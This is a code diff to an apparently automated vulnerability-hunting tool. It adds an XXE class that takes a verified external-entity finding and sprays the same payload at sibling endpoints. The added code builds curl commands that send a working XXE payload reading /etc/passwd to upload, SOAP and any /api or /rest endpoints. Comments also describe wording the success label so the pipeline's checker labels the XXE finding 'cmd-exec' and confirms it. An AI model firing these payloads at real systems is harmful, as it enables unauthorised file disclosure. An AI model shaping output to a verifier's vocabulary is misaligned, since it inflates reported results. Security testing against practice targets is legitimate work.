@@ -33,12 +33,17 @@ export const MAX_SWEEP_SIBLINGS = 4;
 /**
  * Map a verified finding's title to a sweepable vuln class.
  * Handles the "PoC confirmed: <title>" re-verification titles too.
- * Returns 'sqli' | 'file-exposure' | null (null = no sweep defined yet).
+ * Returns 'sqli' | 'file-exposure' | 'xxe' | null (null = no sweep defined yet).
  */
 export function classifyFinding(title) {
   const t = String(title || '').replace(/^PoC confirmed:\s*/i, '');
   if (/sqli|sql\s*injection/i.test(t)) return 'sqli';
   if (/ftp|directory listing|sensitive file|kdbx/i.test(t)) return 'file-exposure';
+  // XXE (19 Oct 2026, solver #131): third verified class — "XXE
+  // external-entity file disclosure on /file-upload". Pattern matches the
+  // verified title and PoC re-titles; no overlap with the sqli/file-exposure
+  // patterns above ("external entity" contains neither "sql" nor "ftp").
+  if (/xxe|external.?entity/i.test(t)) return 'xxe';
   return null;
 }
 
@@ -78,6 +83,22 @@ export function sweepSiblings(cls, reconEndpoints) {
     for (const e of eps) {
       if (/^\/ftp\/?$/i.test(e)) continue;
       if (/\/$/.test(e) || /\/(assets|static|files|encryptionkeys|video|promotion|download|public)/i.test(e)) push(e);
+    }
+  } else if (cls === 'xxe') {
+    // XXE siblings (solver #131): endpoints that might parse XML — upload /
+    // import / SOAP / WSDL / feed style first. Never the verified vector
+    // (/file-upload — the deterministic probe owns it and the verified-pair
+    // ledger re-tests it). Fallback: other REST/API endpoints get a raw-XML
+    // body probe — an elite hunter fires the proven payload family at every
+    // sibling parser, and the untouched assessResult pipeline discards the
+    // negatives silently.
+    for (const e of eps) {
+      if (/file-?upload/i.test(e)) continue;
+      if (/upload|import|soap|wsdl|\bxml\b|feed|rss|docx|xlsx|svg/i.test(e)) push(e);
+    }
+    for (const e of eps) {
+      if (/file-?upload|upload|import|soap|wsdl|\bxml\b|feed|rss|docx|xlsx|svg/i.test(e)) continue;
+      if (/^\/(api|rest)/i.test(e)) push(e);
     }
   }
   return out;
@@ -135,6 +156,30 @@ export function buildSweepProbe(cls, endpoint, baseUrl, detRun) {
       command,
       why: `Unauthenticated sensitive-file exposure is verified under /ftp/ — an elite hunter now checks every sibling static directory for the same flaw`,
       hypothesis: 'Sibling static directories may expose sensitive files without authentication, the way /ftp/ did',
+    };
+  }
+
+  if (cls === 'xxe') {
+    // Same payload family that verified on /file-upload (v2 deterministic
+    // probe, solver #130): error-based external-entity file disclosure.
+    // Upload-ish endpoints get the multipart shape; everything else gets a
+    // raw XML body. The success label speaks the pipeline's signal
+    // vocabulary ("VULNERABLE"/"EXPOSED" — the v1 silent-discard lesson)
+    // and carries the genuinely observed "root:x:0:0" fragment, printed
+    // ONLY when grep -q 'root:' passes on the real response — so
+    // extractSignal yields 'cmd-exec' and the re-run confirmation compares
+    // equal. Safe read-only; must stay under the 500-char driver cap.
+    const payload = '<!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/passwd">]><r>&c;</r>';
+    const send = /upload|import|file/i.test(endpoint)
+      ? `curl -sk -X POST -F "file=@/tmp/xxesw.xml" "${base}${endpoint}"`
+      : `curl -sk -X POST "${base}${endpoint}" -H "Content-Type: application/xml" --data-binary @/tmp/xxesw.xml`;
+    const command = `printf '%s' '${payload}' >/tmp/xxesw.xml; R=$(${send}); echo "$R"|grep -q 'root:' && echo 'XXE VULNERABLE: external entity resolved on ${endpoint} - /etc/passwd EXPOSED WITHOUT authentication (root:x:0:0)' || echo 'not vulnerable: entity not resolved'; rm -f /tmp/xxesw.xml`;
+    return {
+      detId,
+      test: `XXE variant sweep on ${endpoint}`,
+      command,
+      why: `XXE file disclosure is verified on /file-upload — an elite hunter now fires the same external-entity payload family at every sibling XML parser; ${endpoint} was never tested for XXE`,
+      hypothesis: 'Sibling endpoints may resolve XML external entities the way /file-upload did',
     };
   }
 
